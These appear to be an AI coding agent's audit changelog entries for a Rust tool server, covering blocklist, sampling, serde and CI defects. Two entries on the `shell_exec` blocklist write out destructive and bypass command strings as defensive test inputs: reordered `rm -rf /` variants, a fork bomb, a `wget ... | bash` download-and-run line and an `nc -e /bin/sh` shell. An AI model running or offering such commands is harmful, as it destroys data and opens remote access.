The +14 checked is exactly this bullet's fourteen line-numbered pointers, and all fourteen were verified row by row against the line each one describes rather than trusted from a green tally; the +2 advisory is this file's own known exception again — two further mentions of the stale self-pointer it has now declined to re-anchor a fourth time slid off populated lines because every line below this insert moved down by one. Re-running the gate after appending this clause returns the identical tally, which is the fixed point this sentence states. 
- **The `shell_exec` blocklist is enforced on the JSON transport and unreachable on the binary one: a plugin that registers a built-in's name answers that call in-guest (2026-10-13).** `call_tool_binary` at `src/registry.rs:744` resolves a tool name against the plugin registries *before* any built-in arm — first `get_wasm_tool_language` (`src/plugins/mod.rs:646`, the name-to-language map that registration inserts into), then `manifest_wasm_language` at `src/registry.rs:669` — and falls through to the decoded JSON path only when no runtime claims the name. `is_builtin_tool` at `src/registry.rs:2007` classifies the 16 built-in names, but its only two production call sites are at `:2103` and `:2142`, both inside the frame-cache path, and **the binary dispatcher never calls it**. The guard itself sits at `src/registry.rs:1209`. Measured with the new pin `test_shell_exec_blocklist_is_not_reached_on_the_binary_transport` at `tests/binary_protocol_test.rs:303`: an R guest registered under the name `shell_exec` is sent the same `rm -rf /` argument down both transports. The JSON path refuses; the binary path returns the guest's own output, and the assertion carrying the `PINNED DEFECT` marker at `tests/binary_protocol_test.rs:321` states which of the two is expected today. **Nothing destructive ran on either side** — the JSON path refuses before spawning and the guest never reads its arguments. **Reachability measured, not assumed:** a grep of every tracked `.json`/`.toml` outside `target/` for a manifest tool name equal to one of the 16 built-ins returns **0** hits, and a case-insensitive grep of `src/plugins/*.rs` for collision/conflict/reserved/duplicate-name returns **0** lines — there is no name check at registration — so exploiting this needs an operator-authored manifest, and `get_tools`' `known_names` dedupe at `src/registry.rs:181` hides such a plugin from `tools/list` while leaving it answerable. **Red-checked, then reverted:** inserting the 3-line short-circuit `if is_builtin_tool(name) { return call_tool_decoded(name, args_tlv); }` made the pin FAIL at `tests/binary_protocol_test.rs:321` (`test result: FAILED. 0 passed; 1 failed`); reverting it restored `src/registry.rs` byte-for-byte (sha256 `b4ed6a328467d291cf175967816097d341424298ccf903f7f0db9a487e2b72df`, 6,119 lines, LF-pure), so **no behaviour shipped this round.** **Why this is an owner call and not a typo:** the candidate repairs disagree about what a plugin may do — (1) the short-circuit above makes built-ins win on every transport and removes a plugin's ability to shadow a built-in name; (2) collision validation at registration/manifest-load refuses the config earlier but only means something if built-in names are reserved; (3) documented last-write-wins makes shadowing a feature and moves the guard into the plugin path. Shadowing a name is this project's flagship dynamic-registration capability, so which of the three is intended is a product decision. **Bill for (1):** the same 3 lines take `src/registry.rs` from 6,119 to 6,122 and shift the 16 corpus pointers at or below line 1227 by +3, including the `dangerous_unix` pointer at `src/registry.rs:1219` published last round. Gates on this batch: `cargo fmt --all -- --check` exit **0**; `cargo test --test binary_protocol_test` **13 passed / 0 failed** (the pin among them) exit **0**; `cargo clippy` exit **0** (written and read back as `REAL_EXIT_CLIPPY=0`); `cargo +stable test --workspace` on default features **1,165 passed / 0 failed / 55 ignored over 31 result lines** exit **0** (`REAL_EXIT_WS=0`), i.e. the 1,164 recorded for the entry below plus exactly this round's one test. The featured profile was **not** re-run, for the same disk-and-time reason recorded below. **Citation census re-run after this bullet landed: 671 checked / 523 resolve to a populated line / 0 hard failures / 140 advisory / 8 allowed, exit 0** (the buckets reconcile: 523 + 140 + 8 = 671). The +10 checked over the previous 661 is exactly this bullet's ten line-numbered pointers — nine bound on the first insert and the tenth, last round's array pointer, only after this bullet's own prose named the identifier that the cited line carries, which is why an intermediate run read 522 resolve / 141 advisory. The remaining +3 resolve / -3 advisory is this file's own known exception again: three of the five mentions of the stale self-pointer it has thrice declined to re-anchor flipped from advisory to resolving because the insert slid them onto populated lines, so its referent is restated in prose and this bullet is the fourth decline.
- **`shell_exec`'s Unix blocklist carried 62 slots for 60 distinct patterns, and the two dead duplicates sat exactly where a substring matcher cannot reach: option grammar (2026-10-13).** README's security list asserts "62 Unix + 51 Windows command patterns blocked". Counting the string literals in each array: the Windows side is 51 slots / 51 distinct, but `dangerous_unix` at `src/registry.rs:1219` carried 62 slots whose distinct set is **60** — two entries re-state the first two byte-for-byte (`"rm -rf /"` and `"rm -rf /*"` each appear twice inside the same `rm` run). Reading *why* those two forms were listed twice is what surfaced the real defect: the guard tests `cmd_normalized.contains(pattern) || cmd_stripped.contains(pattern)` over the lowercased, whitespace-collapsed command (plus a backslash-stripped second spelling), so every pattern is one literal shape — **reordering the flags or inserting an option between `rm -rf` and the path walks straight past it**. Measured, not argued: the guard's normalization was re-implemented in Python and fed 28 command strings as pure string comparison (nothing was spawned or executed on either side). Pre-repair it refused 16 of the 28 and let **12** through, including `rm -fr /`, `rm -rf --no-preserve-root /`, `sudo rm -fr /*`, `rm --recursive --force /`, `rm -r -f /`, `rm -rf --verbose /`, `rm -rf --preserve-root=no /`, `rm --no-preserve-root -rf /`, `mv / /dev/null`, the space-free fork bomb `:(){:|:&};:` (the blocked pattern is the spaced spelling, so dropping the spaces drops the match), `wget -qO- http://x | bash` and `nc -l -p 4444 -e /bin/sh`. **Repair, deliberately the minimal in-place kind:** the two dead duplicate slots now carry `"rm -fr /"` and `"rm -rf --no-preserve-root"` — the cheapest instances of the class, using capacity the file already reserved instead of growing a heavily cited array. Re-run over the same 28: 19 refused, **9** still allowed — **three** forms closed by two patterns, because `"rm -fr /"` catches `sudo rm -fr /*` as a substring as well — and no previously-refused form became allowed, so the differential is clean. The Unix array is now 62 slots / 62 distinct — README's headline reads true as a distinct count for the first time. **This is wire-visible:** a `shell_exec` call that used to run now returns the "dangerous pattern" refusal, so it joins the bless-or-revert batch; reverting means restoring those two literals to `"rm -rf /"` / `"rm -rf /*"` and deleting the new test. **New witness test** `test_shell_exec_blocks_reordered_and_long_option_rm` asserts both forms are refused with that error, and every probe is prefixed `false && ` so the test cannot become destructive if the guard it tests regresses: `false` exits 1 under POSIX sh, and under Windows cmd `false` is not a program at all, so the `&&` tail never fires on either shell. It went in at the end of the test module, i.e. after the highest cited line in the file (the corpus cites 16 lines at or below the blocklist and 19 above it, max 6,093), so no pointer moved: `src/registry.rs` is **6,119 lines**, LF-pure, from 6,101 — the array edit was line-neutral and the 18-line test tail plus rustfmt's reflow (it joined the probe array onto one line and split the chained `.contains()` across four) netted 18. **What this does not fix, and it is an owner call:** the substring architecture *is* the bug — a literal list cannot enumerate an option grammar, so closing the class needs a tokenising check (argv parsed, program plus recursive/force flags matched against a path resolving to `/`, `~`, `*` or a block device) and/or a pure `fn blockage(cmd: &str) -> Option<&'static str>` so tests assert the classifier without spawning anything. The 9 remaining allowed forms above are the negative-control set that design should be written against. Gates on this batch: `cargo fmt --all -- --check` exit **0**; `cargo test --lib registry::tests::test_shell_exec` **28 passed / 0 failed** (the new test among them) exit **0**; full `cargo test --lib` **760 passed / 0 failed / 38 ignored** exit **0**; `cargo +stable test --workspace` on default features **1,164 passed / 0 failed / 55 ignored over 31 result lines** exit **0**, i.e. the previously recorded 1,163 plus exactly this round's one test. The featured profile (recorded 1,235 / 0 / 55) was **not** re-run: re-codegen of the whole dependency cone with `http,database,oauth2` on this host is a disk-and-time event, so its expected +1 is derived here rather than measured. **Citation census re-run after this bullet landed: 661 checked / 510 resolve to a populated line / 0 hard failures / 143 advisory / 8 allowed, exit 0** (the buckets reconcile: 510 + 143 + 8 = 661). The +1 checked is this bullet's own `dangerous_unix` pointer, which resolves; the slide from 660 / 512 / 140 is the file's own known exception, quoted from the bullet that records it: "the stale self-pointer it has twice declined to re-anchor and broken again by every append". This insert moved it one line again and flipped three of the five mentions of that stale self-pointer from resolving to advisory, i.e. exactly the observed -3 resolve / +3 advisory; its referent has been restated in prose instead of re-anchored, which stays a third decline.
- **A clean clone cannot rebuild the shipped `quickjs.wasm`, and the one copy of the patch that makes it work is now backed up outside the repo (2026-10-13).** `git ls-files -s` shows exactly one gitlink in the entire repository: `bench_tools/quickjs_wasm/src`, recorded at mode 160000 pointing at commit 00c41716209756c2879ff9e3d1300531dbecd14c, with **zero tracked `.gitmodules`** — so nothing can resolve it, and GitHub's own checkout of the pushed state logs `fatal: No url found for submodule path 'bench_tools/quickjs_wasm/src' in .gitmodules`. What a fresh clone actually gets under that directory is 29 tracked paths: 25 of them copies of the published package under `node_modules/`, plus `package.json`, `package-lock.json` and the built `quickjs.wasm` (754,433 B, dated 2026-09-10) — i.e. the deliverable is a build product whose source tree is unresolvable. Worse is that the guest's TLV decoding patch is not committed even in the *nested* repository: `git status` inside it reports `M c/interface.c` and `git diff --stat` reads **253 insertions** in that one file, so the only copy lived in this machine's working tree. Backed up this round and re-verified before writing these figures: `quickjs-wasi-local-20261013.bundle` (2,966,316 B; `git bundle verify` prints "is okay" and "The bundle records a complete history", HEAD the same 00c41716… as the gitlink, plus every `quickjs-wasi@…` tag and `v0.0.1`) and `quickjs-interface-c-tlv-20261013.patch` (271 lines, 8,437 B) in the Documents directory beside the repository. **No rebuild was attempted**: compiling that guest needs the WASIX/wasm toolchain leg and would overwrite the `.wasm` the runtime loads, which is an owner call, not a cleanup. The three ways to close it — vendor the guest sources, add a real `.gitmodules` URL, or push a fork to back the gitlink — are all recorded as owed.
- **Three more "one shared renderer / byte-for-byte parity" doc claims falsified against the code, and the three accurate ones left standing (2026-10-13).** This is the same wording disease as the setLevel paragraph, found by re-auditing the parity claims rather than trusting them. (1) The error-classification parity row in the NDA protocol reference said the dashboard gate compares the `Error type:` / `Hint:` suffix each path returns. `dashboard/classify_parity.mjs` classifies both responses into `{kind, hint}`, but its comparison is on `kind` alone and its exit code counts only those mismatches; the hint is captured and printed for both paths and never gates anything. The row now states the two-kinds gate and describes the hint as reporting. (2) The same row claimed a unit test "pins the two to the same renderer". Measured: `tool_error_text` has exactly **three production call sites** — one in the JSON-RPC dispatcher, two in the shared-memory/NMCP binary file — and the test in `src/protocol/nmcp_binary.rs` calls the helper *directly* and asserts only `contains("Error type: …")`, `starts_with("Error running tool '")` and `contains("Hint: ")`. A test of predicates on one function compares **nothing across sites**, so the row now says what is actually load-bearing: the single helper is the reason the paths agree, the test pins that helper's own classification table, and **no test drives a dispatcher's error arm** — an edit that drops any one of the three call sites leaves the whole suite green. (3) The registry's NDA round-trip test comment described a call the test never makes: it converts a JSON-RPC request, asserts the conversion `is_ok()`, then checks only that the frame cache contains the tool name — it never dispatches, so neither the NDA path nor the C# engine fall-through a real call would take is exercised. The comment is replaced with what the assertions cover, written line-neutrally in a heavily cited file (`src/registry.rs` still 6,101 lines, LF-pure at that edit; the shell_exec blocklist bullet above takes it to 6,119). Claims re-checked and left unchanged: the helper really is shared by all three sites, and its classification table really is pinned by that test. Verification for this batch: `cargo +stable fmt --all -- --check` exit **0**; `cargo +stable check --workspace --all-targets --features http,database,oauth2` exit **0**; citation census re-run *after* these three bullets were inserted reads **660 checked / 512 resolve to a populated line / 0 hard failures / 140 advisory / 8 allowed**, exit **0** — the checked count held at 660 because none of the three bullets adds a new line-numbered pointer, and the single-token slide from 511 resolve / 141 advisory to 512 / 140 is this file's own already-recorded deliberate exception: the stale self-pointer it has twice declined to re-anchor (see the bullet that records it as deliberately stale, declined to re-anchor twice, and broken again by every append), which this insert pushed one of its mentions onto a populated line. Two corrections had to be made to reach that figure honestly: the first draft of this very sentence published the pre-insert tally 511/141, which the act of inserting the bullets invalidated, and its replacement then wrote the stale pointer out by number and raised the checked count to 661 — so the sentence reporting the number perturbed it twice before landing on its own fixed point, which is the tally this sentence states. Re-running the gate after this edit returns the identical tally, exit 0. Strengthening either test is filed as the owner call it is (rename, or add a dispatcher-driven arm and decide whether a real NDA call belongs in the registry suite).
- **`Deploy Edge` could never have built on a GitHub-hosted runner: its toolchain step ran a command that cannot succeed (2026-10-13).** The workflow installed the WASIX toolchain with `rustup toolchain install wasix`, which exits `error: invalid toolchain name: 'wasix'` — there is no such rustup channel — and `cargo-wasix` (0.1.34) ships no toolchain-install subcommand either. The build it gates is `deploy/build-edge.py`, which ends in `cargo wasix +wasix build --release --locked -p velocity-mcp-edge --bin velocity-edge` after staging a temp workspace, swapping crates.io for `sparse+https://cargo-registry.wasix.org/`, pinning `deploy/edge-wasix.lock` and setting the atomics/bulk-memory/mutable-globals/reference-types/multivalue RUSTFLAGS; that command needs a rustup toolchain *named* `wasix` to already exist. The one on the buildbox is a hand-provisioned directory (rustc 1.97.1-dev, and no `lib/rustlib/MANIFEST`, which is why no installer can reproduce it). Repair is honest rather than aspirational: the step is now **"Verify WASIX Rust toolchain"** and runs `rustup run wasix rustc --version` before `rustup default wasix`, so a runner without the toolchain fails with the real reason in seconds instead of an invalid-argument message. The edit is line-count neutral in a cited workflow (still 244 lines, LF-pure; the step the changelog points at by line — the scoped `-p velocity-mcp-core -p velocity-mcp-edge` test run — keeps its position) and `docs/edge_deployment_quickstart.md`'s "Build fails" paragraph, which told users to run the same impossible install, now states the requirement and shows the verify command instead. A repo-wide grep for the invalid command returns **0** hits. **Not closed, because it cannot be closed from here:** no GitHub-hosted runner can produce that toolchain and I found no authoritative provisioning source, so I did not invent an install command. Owner options, one decision away: register the buildbox as a self-hosted runner, vendor or document a reproducible `+wasix` toolchain artifact, or retire the workflow and keep Edge builds local through `deploy/build-edge.py`.

- **Sampling registration was a silent no-op after the first call, spec-spelled `modelPreferences`/`metadata` fields decoded to `None`, and the three lib tests that read the handler global were green only because of the harness's alphabetical default (2026-10-13).**
  - **Defect 1, the one-shot handler (`src/sampling.rs:187`).** `register_sampling_callback` ended in `SAMPLING_HANDLER.get_or_init(|| Mutex::new(Some(Box::new(CallbackWrapper { f: callback }))));`. `OnceLock` cannot express replacement: the first call that ever runs wins, and every later call initialises nothing, assigns nothing and returns `()` normally — a host that re-registers to change its callback gets no error and no change. Red, re-measured this round against the current code by temporarily reverting `set_handler` to first-wins (see *How both reds were produced*): `cargo +stable test --features database,oauth2 --test sampling_callback` printed **1 passed / 2 failed**, with `re_registration_replaces_the_previous_callback` panicking at `tests/sampling_callback.rs:79:5` on `assertion `left == right` failed: the second registration was silently dropped — left: `String("Response with metadata")`, right: `"second"`. The left value is a *different test's* callback replying from the same process, so this single failure line demonstrates both the drop and the cross-test leakage it creates. Repair: registration now calls `set_handler` (`src/sampling.rs:336`), which initialises the slot to `None` and assigns under the mutex — the `OnceLock`'s one-time guarantee still protects the `Mutex`, while the handler inside it becomes replaceable. Host-visible: last registration wins instead of first. Revert path: restore the one-line `get_or_init` at `:187` and delete `set_handler`.
  - **Defect 2, camelCase (`src/sampling.rs:48`, `:50`, `:53`, `:69`).** `handle_sampling_create_message` (`:193`) hands the client's `modelPreferences` and `metadata` objects to `serde_json::from_value` (`:206`, `:210`), but `ModelPreferences.cost_priority`/`speed_priority`/`intelligence_priority` and `SamplingMetadata.progress_token` carried only `skip_serializing_if`. So the spec spellings `costPriority`, `speedPriority`, `intelligencePriority`, `progressToken` decoded to `None` while the Rust field names decoded fine — the asymmetry ran the wrong way against the MCP spec and against this crate's own `src/streaming.rs:25`, which already renames `progressToken`. The gap survived the old suite because the one test that exercised metadata sent it in snake_case, pinning the wrong spelling. Red, re-measured in the same reverted tree (`cargo +stable test --lib -- spec_spelled_preferences_and_metadata_parse`): panicked at `src/sampling.rs:567:9`, `assertion `left == right` failed: costPriority not parsed — left: `None`, right: `Some(0.25)`. That test deserialises without touching the handler global, so unlike the integration failure above it isolates the parser from defect 1 — which is why it exists as a separate lib test.
  - **What the repair also does, measured rather than reasoned: it swaps which spelling is silently dropped.** `rename` with no `alias` makes the four keys decode *only* as `costPriority` / `speedPriority` / `intelligencePriority` / `progressToken`, so the Rust spellings that worked before this fix (attested, not inferred: `git show` of the committed file gives these four fields no rename attribute at all, so serde's default field-name spelling was the only accepted one) now yield `None` with no error at all. Third throwaway integration binary (written for the run, deleted after it, tree unchanged), same provenance as the probes above: `MEASURED [modelPreferences] camel cost=Some(0.25) speed=Some(0.5) intel=Some(0.75) | snake cost=None speed=None intel=None` and `MEASURED [metadata] camel token=Some("pt-1") conv=Some("c-1") | snake token=None conv=Some("c-1")`. `conversation_id` is untouched by the change because it was never renamed, and `SamplingMetadata`'s `#[serde(flatten)]` map still retains the unknown key (`extras={"progress_token": String("pt-1")}`) even with the typed field `None`, whereas `ModelPreferences` carries no flatten and loses it outright. No shipped sender is affected — `client/` and the SDK directories hold zero occurrences of either spelling for these fields, and the grep counts hits only in `src/sampling.rs`, `src/streaming.rs`, the two protocol dispatchers, `tests/` and `docs/API.md` — which is why this is disclosed rather than reverted. The strictly-superset repair, `#[serde(alias)]` on the four keys so both spellings decode, is filed as an owner call rather than applied here: it decides what the crate silently accepts, not merely what it rejects.
  - **How both reds were produced, and the first attempt that produced neither.** The fixes are already on disk, so each red was measured by temporarily restoring the pre-fix behaviour in `src/sampling.rs` and putting the file back: the instrument is `redcheck541.py` (outside the repo), whose `break` mode weakens `set_handler` and strips the four `rename` attributes under assert-before-write, and whose `restore` mode copies the saved bytes back and asserts sha256 equality — verified this round at `12f81f4c3ed832f0...`, with `--test sampling_callback` **3 / 3**, `--lib -- sampling::` **8 / 8**, both no-handler asserters green, and `cargo +stable fmt --all -- --check` exit **0** after the restore. Disclosed because that instrument's *first* run printed **no red at all** (`BREAK_RC=1`, then 3 passed and 1 passed): its patterns assumed an eight-space guard line and an all-inline `intelligencePriority` attribute, and the real file has a four-space one and a rustfmt-split four-line one. A break that silently matches nothing turns a red check into a green run of the fixed code, which is the exact false-pass this whole entry is about.
  - **Defect 3, the test-hygiene finding, and what was actually measured.** Two lib tests assert the *empty* handler state — `protocol::json_rpc::tests::test_sampling_create_message_no_handler_returns_error` and `protocol::nmcp_binary::tests::test_dispatch_sampling_create_no_handler` — and before this change the only tests that mutated that global lived in the same binary, so those two assertions could pass or fail depending on which test reached `SAMPLING_HANDLER` first. What was measured on the pre-fix tree, and the false instrument that came first. Every natural command on true HEAD is green, and that was re-measured here rather than inherited: the featured lib binary ran three consecutive times at **826 passed / 0 failed / 38 ignored**, `--lib -- sampling` was **15 / 15**, and a hand-picked three-test window (both no-handler asserters plus one registering test, `--test-threads=1`) ran **3 passed**, exit **0** — which falsifies the figure an earlier note of mine carried for that window, "deterministically 2 failures"; that figure is not published here. The mechanism is the harness's own documented default, read from the built test binary's `--help` ("By default, the tests are run in alphabetical order"): `protocol::json_rpc::…` and `protocol::nmcp_binary::…` sort before `sampling::…`, so the asserters always ran first and the invariant was never exercised. Making the adverse order explicit *through the harness* is not possible on this toolchain, and the first attempt at it produced a result worth recording as an anti-example — a 200-seed `--test-threads=1 --shuffle-seed=$i` loop and a 50-seed multi-threaded loop printed `red=200` and `red=50`, and every one of those 250 "failures" was `error: The "shuffle-seed" option is only accepted on the nightly compiler with -Z unstable-options` at exit **101** with zero test lines emitted. That is an argument-parsing rejection being counted as a test red, not a hazard measurement. The order was therefore forced structurally instead: with true HEAD's bytes on disk (attested copy `samp_head.bak`, sha256 `22d4e3e12c866819...`) and a 20-line probe appended at EOF of `src/audit.rs` — a module whose crate-level name sorts ahead of `protocol`, so `audit::hazard_probe::a_probe_registers` runs first in the default order — whose only statement is one `register_sampling_callback` call, the four-test leg printed **1 passed / 2 failed**, exit **101**: `src/protocol/json_rpc.rs:1394:9` `assertion `left == right` failed: left: `Null`, right: `-32603` and `src/protocol/nmcp_binary.rs:1454:9` `left: `0`, right: `1`. The same two asserters alone in the same binary printed **2 passed**, exit **0**, so what breaks is not the assertion but the fact that another test in the process reached the global first. The probe also reddens the natural full-suite command, and did so on every run: three default-thread runs and one single-thread run of the whole featured lib binary each printed **824 passed / 3 failed / 38 ignored** (824 + 3 + 38 = 865 = HEAD's 864 plus the probe). The third failure is a test this round had not previously flagged: `protocol::json_rpc::tests::test_sampling_create_message_error_path` (`src/protocol/json_rpc.rs:1014`) asserts `res["error"]["code"].is_number() || res["result"]["isError"] == true`, which is satisfiable only on the no-handler branch — so a registered callback makes it fail, and the honest count of lib tests that depend on that global is three, not two. Both instrument files were restored and hash-verified afterwards (`src/sampling.rs` back to `12f81f4c3ed832f0...`, `src/audit.rs` back to `b6c67567a8f461e2...`, `git status --porcelain src/audit.rs` empty, no stray probe file), and `--lib -- sampling` re-ran **14 passed / 849 filtered** on the restored bytes. Repair chosen: the two registration-using tests moved to their own integration binary `tests/sampling_callback.rs`, serialized there by a local `HANDLER_LOCK`, rather than weakening either assert. After the move `register_sampling_callback` occurs in `src/` exactly once — the definition at `src/sampling.rs:168`, counted by `grep -o` rather than by matching lines — and its only call sites are the four statements in `tests/sampling_callback.rs` (lines 53, 75, 76, 91; the file shows six occurrences in total because one is the import at `:14` and one is prose in its module doc at `:3`), all of which run in a process that owns its handler, so those two no-handler asserters and the `test_sampling_create_message_error_path` disjunction that only holds on the no-handler branch are structurally protected instead of ordering-protected. Verified after the fix: lib binary **20 consecutive runs at 825 passed / 0 failed / 38 ignored**, `--lib -- sampling` **14 passed / 849 filtered** (14 + 849 = 863 = 825 + 38, so the filter is drawn from the same population), the narrower `--lib -- sampling::` **8 / 8**, and `--test sampling_callback` **3 / 3**.
  - **A fourth line, same class as the audit-registry wording filed under #538:** `add_to_conversation` evicted on `history.keys().next().cloned()` while the warn it emitted claimed `"evicting oldest"`. The binding is now `arbitrary_key` and the message reads `"Conversation history full ({}), evicting one"` (`src/sampling.rs:126-128`). `HashMap` iteration order is neither oldest nor insertion order, so this corrects the log's claim, not the eviction policy.
  - **Re-anchor bill, paid.** The `intelligencePriority` `rename` made that attribute longer than rustfmt's limit, and rustfmt split it across four lines — which moved `create_sampling_request` from 259 to 262 and `create_sampling_request_with_history` from 297 to 300. `docs/API.md:1489`, the capability table's already-adjudicated `sampling: {}` row, is re-anchored to `:262` and `:300`; the row's own verdict ("no" — declared, never emitted in production) is unchanged, so this round files no duplicate owner call against it.
  - **Verification at this round's fixed point.** `cargo +stable fmt --all -- --check` exit **0**; `cargo +stable clippy --features http,database,oauth2 --all-targets -- -D warnings` exit **0**; `cargo +stable test --workspace` **1,163 passed / 0 failed / 55 ignored** over **31** `test result:` rows (default features, lib row 759); featured `--workspace` **1,235 passed / 0 failed / 55 ignored over 31 `test result:` rows (lib row 825)**; citation census 660 checked / 511 resolve to a populated line / 0 hard failures / 141 advisory / 8 allowed, exit **0**, re-measured after the byte measurements above were spliced into this same bullet (those additions contribute exactly six citations and all six resolve), and again after the spelling-disclosure bullet was appended *above* this one: that append added one line and no citation, yet moved the split by exactly one — **not** a repair. It is one of the **seven** occurrences of this file's own deliberately stale line-148 self-pointer landing, because of the shift, on a sentence whose text happens to contain the substring that citation's identifier pool searches for (`any`), so it now *resolves* while still pointing at the wrong sentence — measured split for that pointer is now **4 resolving / 3 advisory**, and all four resolutions are incidental token matches rather than correct anchors. A green anchor carrying a falsified description, which is this census's known failure mode, not a fixed defect. The figure itself is written without a `path:line` token, so publishing it cannot move the tally (checked by re-running after this sentence went in, not assumed). The same follow-up also closes a documentation gap this round found by grep: at the time of the grep `conversation` occurred in only three tracked files — `src/sampling.rs`, `tests/integration.rs`, `CHANGELOG.md` — and in no doc at all (re-grepped after that row landed: four tracked files match now, docs/API.md being the one added), so the `sampling/createMessage` row of the method table now states, in place, the camelCase-only `modelPreferences` keys together with the consequence measured for the old Rust spellings (they decode to `None` with no error, and a host sending them gets unmodelled preferences), the two metadata keys and their spellings, the numeric-`progressToken` failure mode, the count-only bounds, and that the history write precedes the refusal; the row was extended within its own line both times, so no line of the file moved and no anchor needed re-pointing (re-checked after this round's second extension: line count unchanged at 1529, endings unchanged). Earlier workspace figures recorded in this file describe pre-#541 trees and are not restated as this round's baseline, because only the featured lib row was measured both sides of the change (826 to 825).
  - **Five findings deliberately not fixed, filed as owner calls.** (1) `src/sampling.rs:223-229` writes the conversation history keyed on the *client-supplied* `metadata.conversation_id` before the handler lookup at `:231`, so a request the server then refuses with `"No sampling callback registered"` (`:257`) still consumes and rewrites state; the store is bounded by count only — `MAX_CONVERSATIONS = 256` (`src/sampling.rs:124`) and `MAX_HISTORY = 1000` *messages* per conversation (`src/sampling.rs:134`) — with no byte bound on `content.text`, and the path is reachable on all four transports (HTTP's own ceiling is the `max_request_size` body default, 10 MiB, `src/config.rs:326`). Measured this round by a second throwaway integration binary (same provenance as the #544 probe: written for the run, deleted after it, tree unchanged), in a process that registers no callback so every request is refused: three refused requests retained 1,024 / 1,048,576 / 20,971,520 bytes verbatim, so the one request carrying a 20-message array appended 20 MiB in a single call, and 1,200 sent messages plateaued at exactly 1,000 retained — the message-count FIFO is the only release on this path and no byte limit exists. Nothing can reclaim it either: `clear_conversation` (`src/sampling.rs:152`) has no production call site, and the store's only reader is the builder at `src/sampling.rs:300`, which calls `get_conversation` mid-body, counted at 0 in production by `docs/API.md:1489`. (2) `src/sampling.rs:232` uses `if let Ok(lock)`, which turns a poisoned handler mutex into the same "no callback registered" refusal with no signal — the #539 silent-degradation class, here on the sampling path. (3) `SamplingMetadata.progress_token` is `Option<String>` (`src/sampling.rs:70`) while this crate's own `ProgressToken` (`src/streaming.rs:37`) is the spec's `string | integer` union, so a client that sends the legal numeric form fails the *whole* `SamplingMetadata` deserialize at `:210`, `.ok()` discards the error, and the `conversation_id` sitting in that same object is lost as collateral — conversation tracking stops for that caller with no signal. Measured with a throwaway integration binary (`tests/tmp_probe_numtoken.rs`, written for the probe and deleted after it; the repo tree is unchanged), identical params differing only in the token's JSON type: `MEASURED numeric-token: ok=false history_len=0 err=Some("No sampling callback registered")` against `MEASURED string-token: history_len=1`. The same probe is a second, independent confirmation of finding (1): the refused request still reached the history write. Widening the field to `ProgressToken` would start recording history for hosts that silently get none today, so it is wire-adjacent behaviour and joins the bless-or-revert batch instead of landing in this round. (4) **`SamplingRequest`'s own serde spelling disagrees with the spelling this crate writes and reads** (filed as #547, found by the crate-wide rename inventory below rather than by reading this module again): the `params` entry `model_preferences` and the entry `system_prompt` carry `skip_serializing_if` with no rename, so serializing the public struct emits snake_case keys, while the same crate's encoder hand-writes camelCase into `params["modelPreferences"]` and `params["systemPrompt"]`, and its reader accepts only those camelCase spellings. Consequence for a library consumer: serializing the `SamplingRequest` a callback receives produces keys this crate then discards on read-back, with no error. The existing gate cannot see it — `test_sampling_request_serialization` asserts the three keys it sets values for and leaves both mismatched fields at `None`, which `skip_serializing_if` omits from the emitted string entirely, so the assertion is structurally incapable of observing the defect. Not binary-wire-reachable, and measured as such: the only in-crate caller of the builder is the history variant, itself counted at 0 in production, and no `src/` path serializes `SamplingRequest` at all, so this is crate-API-visible only — the same reachability class as #541. Renaming the two fields would flip which spelling is silently dropped, exactly as #541's fix did, so it belongs with the #546 bless-or-revert batch rather than in this round. The inventory that found it, measured by grep over `src/`: 22 `serde(rename` attributes, 0 `serde(alias`, 0 `rename_all` anywhere in the module tree; and of the 66 unrenamed snake_case fields across 58 `Deserialize` structs, only these two sit on an MCP-spec camelCase referent — the config, OAuth2 identity-provider-response and plugin-manifest spellings are legitimately snake_case, the four list cursors are hand-written as `nextCursor` in the `json!` builders rather than serde-renamed, and the SSE query key matches the spelling its method table documents, so no further rename is owed. (5) **The two `logging/setLevel` arms are still two separate implementations, and the method table's own prose said they were one** (filed as #548, together with a docs repair made this round). The shared-memory arm delegates to the shared validator; the JSON-RPC arm keeps an inline copy of the same eight-name match, the same poisoned-mutex `if let Ok` store, the same `Log level changed` info line and the same empty-object ack — its arm body is the 27 lines from the parameter read through the closing of the ack object. The sentence in the Declared Capabilities paragraph asserted that both arms now route through one parser, which is true of the binary arm and false of the JSON-RPC one; it is corrected in place, inside its own line and with no citation added, so the census figure above stays at its fixed point. Behaviour is identical today because the parity test named in that same paragraph compares the two dispatchers' answers as parsed JSON values — `assert_eq!` on two `serde_json::Value`s, which is key-order- and whitespace-insensitive — over the eleven level names, so this is a maintenance hazard rather than a wire defect: an edit to either copy diverges silently unless that name list is widened too. Consolidation is not cheap — removing the inline copy replaces that 27-line body with a short delegate call and shifts every dispatcher line below it, and a grep over the tracked markdown counts 76 citations to that dispatcher file at line numbers past the arm (63 of them in this file, 13 in the API doc), every one of which would need re-anchoring plus a full census re-run. Third item on the same path, same class as #543: the shared validator's `if let Ok` skips the store on a poisoned `LOG_LEVEL` mutex, then unconditionally logs that the level changed and acks an empty result, so a poison yields a written-down-but-unrecorded change; that is unobservable in behaviour today only because the stored level has no reader anywhere in the tree, which is #507, and it becomes a false ack the moment the level is wired to the live filter. Three further instances of that same false-parity wording came out of re-reading the paragraph back against the code, and all are repaired inside their own lines. That dispatcher's level-parity test comment asserted that *both* arms now call the shared validator — true of the binary arm, false of the JSON-RPC one, whose arm is an inline copy, and the call-site grep returns exactly one hit — and several sentences across this entry, the API doc's capability paragraph and that file's test comments described the parity checks as byte-for-byte comparisons when the two that gate dispatcher answers are `assert_eq!` on parsed `serde_json::Value`s, which is key-order- and whitespace-insensitive. The third is a stronger case: the tool-error parity test compares nothing at all — it asserts `contains` and `starts_with` predicates on one renderer's output — so its comment's claim that byte equality there *is* transport equality was false on both halves. Transport equality does hold, but by call site: `tool_error_text` has exactly three production callers, one per dispatcher, which is the shared-code case the level arm is not, and that contrast is the durable point. The direct-encoder test that really does compare `Vec<u8>` buffers keeps its byte-identical wording, measured accurate there. Every edit in this batch is comment- or prose-only, so no cited line number in that dispatcher moved (measured with awk: the file is still 2,186 lines), behaviour is untouched and the workspace totals above are unchanged. The batch was re-verified on the edited tree rather than assumed safe: the three parity tests in that dispatcher (`both_dispatchers_answer_the_same_level_request`, `every_transport_renders_the_same_classified_error`, `both_dispatchers_page_the_same_tools_list`) measure 3 passed / 0 failed with 794 filtered out at exit 0, which independently re-confirms this profile's 797-case lib total, and `cargo +stable fmt --all -- --check` re-runs clean.

